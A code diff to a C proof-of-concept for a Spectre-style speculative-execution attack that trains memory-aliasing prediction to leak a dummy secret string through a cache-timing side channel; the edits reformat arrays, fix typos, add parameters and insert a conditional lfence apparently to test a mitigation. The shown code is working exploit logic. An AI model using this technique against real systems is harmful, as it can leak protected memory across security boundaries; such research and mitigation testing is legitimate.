@@ -23,24 +23,7 @@ Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
 uint8_t unused1[64];
-uint32_t array1[16] = {
-  0xb0,
-  0xb1,
-  0xb2,
-  0xb3,
-  0xb4,
-  0xb5,
-  0xb6,
-  0xb7,
-  0xb8,
-  0xb9,
-  0xba,
-  0xbb,
-  0xbc,
-  0xbd,
-  0xbe,
-  0xbf,
-};
+uint32_t array1[16] = { 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf };
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 int32_t big_block[4096];
@@ -49,60 +32,25 @@ volatile int32_t* load_addrs[NUM_PAGES];
 #define NUM_BAGS (4096/(sizeof(int32_t)))
 volatile int32_t store_addrs[NUM_BAGS];
 
-const uint32_t secret[]     =
-{'T',
-  'h',
-  'e',
-  ' ',
-  'M',
-  'a',
-  'g',
-  'i',
-  'c',
-  ' ',
-  'W',
-  'o',
-  'r',
-  'd',
-  's',
-  ' ',
-  'a',
-  'r',
-  'e',
-  ' ',
-  'S',
-  'q',
-  'u',
-  'e',
-  'a',
-  'm',
-  'i',
-  's',
-  'h',
-  ' ',
-  'O',
-  's',
-  's',
-  'i',
-  'f',
-  'r',
-  'a',
-  'g',
-  'e',
-  '.',
-};
+const uint32_t secret[] = {'T', 'h', 'e', ' ', 'M', 'a', 'g', 'i', 'c', ' ', 'W', 'o', 'r', 'd', 's', ' ', 'a', 'r', 'e', ' ', 'S', 'q', 'u', 'e', 'a', 'm', 'i', 's', 'h', ' ', 'O', 's', 's', 'i', 'f', 'r', 'a', 'g', 'e', '.' };
 
-uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
 
 
 /* By training the aliasing detection, we can cause *load_addr to load the
  * value stored at *store_addr even when store_addr != load_addr. We abuse this
  * to read and leak values of secret[] through *load_addr, despite *load_addr
  * never actually containing these values. */
-void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr) {
+void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr,  uint64_t  training_alias, uint64_t malicious_alias) {
+ // printf("store_addr: %p load_addr: %p    x: %p   malicious pass: %p   \n", store_addr, load_addr, x, mal);
+
   *store_addr = array1[x]+1;
   // placing an lfence here after the store prevents the vulnerability
-  temp &= array2[(*(load_addr)-1) * 512];
+//          alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
+  if (load_addr == store_addr) _mm_lfence();
+
+ temp &= array2[(*(load_addr)-1) * 512];
+ //  temp &= array2[(*((int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias))))-1) * 512];
 }
 
 
@@ -148,8 +96,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
         _mm_lfence();
 
         /* Call the victim! */
-        victim_function(x, &store_addrs[dropnum], alias_p);
-
+        victim_function(x, &store_addrs[dropnum], alias_p, training_alias, malicious_alias);
       }
     }
 
@@ -159,7 +106,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
       addr = & array2[mix_i * 512];
 
     /*
-    We need to accuratly measure the memory access to the current index of the
+    We need to accurately measure the memory access to the current index of the
     array so we can determine which index was cached by the malicious mispredicted code.
 
     The best way to do this is to use the rdtscp instruction, which measures current
@@ -188,7 +135,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
       printf("%02x/%d ", i, results[i]);
     }
   }
-  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+  results[0] ^= junk; /* use junk so code above won't get optimized out*/
 }
 
 /*
